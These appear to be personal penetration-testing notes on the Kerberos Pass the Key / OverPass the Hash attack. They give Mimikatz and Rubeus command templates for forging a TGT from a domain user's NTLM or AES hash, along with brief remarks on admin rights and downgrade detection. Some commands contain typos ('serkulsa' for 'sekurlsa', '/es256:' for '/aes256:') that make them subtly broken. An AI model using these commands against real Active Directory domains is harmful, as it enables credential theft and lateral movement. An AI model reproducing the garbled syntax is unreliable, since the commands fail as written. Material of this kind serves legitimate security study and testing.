---
aliases:
  - Pass the key/ Over the Hash
---
Forging a tgt:
Converting the hash/key(rc4_hmac, aes256_cts_hmac_sha1) for a `domain-joined usr` into a `TGT`
we need the
- Users hash 
- `serkulsa::ekeys` dumps kerberos encryption keys 
- `AES256_HMAC` and `RC4_HMAC` keys
Mimikatz + Rubeus  for Pass the Key 
```powershell 
mimikatz.exe privilege::debug "serkulsa::pth /domain: /user: /ntlm: " exit
```
- this will create a new `cmd.exe` instance
To forge
`asktgt` module -> rubeus
- username 
- domain 
- hash - e `/rc4`, `/aes128`, `/aes256`, or `/des`. Any 
```powershell 
Rubeus.exe asktgt /domain: /user: /es256: /nowrap 
```
> **Note:** Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.

> **Note:** Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges. If we use an rc4_hmac (NTLM) hash in a Kerberos exchange instead of an aes256_cts_hmac_sha1 (or aes128) key, it may be detected as an "encryption downgrade."

